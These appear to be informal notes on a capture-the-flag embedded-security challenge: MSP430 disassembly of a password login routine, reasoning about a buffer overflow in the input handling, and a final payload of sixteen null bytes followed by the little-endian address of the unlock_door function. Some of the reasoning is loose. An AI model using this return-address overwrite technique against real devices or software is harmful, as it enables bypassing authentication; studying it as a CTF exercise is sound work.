4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	#0x4532 <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	#0x4536 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret


4452 <test_password_valid>
4452:  0412           push	r4
4454:  0441           mov	sp, r4
4456:  2453           incd	r4
4458:  2183           decd	sp
445a:  c443 fcff      mov.b	#0x0, -0x4(r4)
445e:  3e40 fcff      mov	#0xfffc, r14
4462:  0e54           add	r4, r14
4464:  0e12           push	r14
4466:  0f12           push	r15
4468:  3012 7d00      push	#0x7d
446c:  b012 4245      call	#0x4542 <INT>
4470:  5f44 fcff      mov.b	-0x4(r4), r15
4474:  8f11           sxt	r15
4476:  3152           add	#0x8, sp
4478:  3441           pop	r4
447a:  3041           ret


Remember: passwords are between 8 and 16 characters.

size 48 buffer  0x30

r4 = 43ec
(r4)-4  --> 43e8  = 0
r14 = 43e8


the getsn  function uses interrupt 0x2
this calls the gets routine which does not handle the null bytes
input starts at 0x43ef for 16 bytes upto 0x4400
send too many null bytes and overwrite / corrupt memory
write past the end of the stack into the .text section at 0x4400
max code corruption  -->  44ef to 441e


in login after enter no password prints message and add 10 to sp
right before ret pops the address on top of stack is 0x443c
now on the return it will jump to the __stop_progExec__ function instead of main


4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret

4438 <main>
4438:  b012 0045      call	#0x4500 <login>

443c <__stop_progExec__>
443c:  32d0 f000      bis	#0xf0, sr
4440:  fd3f           jmp	#0x443c <__stop_progExec__+0x0>

4446 <unlock_door>
4446:  3012 7f00      push	#0x7f
444a:  b012 4245      call	#0x4542 <INT>
444e:  2153           incd	sp
4450:  3041           ret



&__stop_progExec__  == 0x443c
? 0x443c - 0x10  = 0x442c
sp was 0x442c


if sp was 0x4446 could jump to unlock_door
need to use the corruption to overwrite the stack
write 16 nullbytes and then the address of unlock function (little endian)

000000000000000000000000000000004644

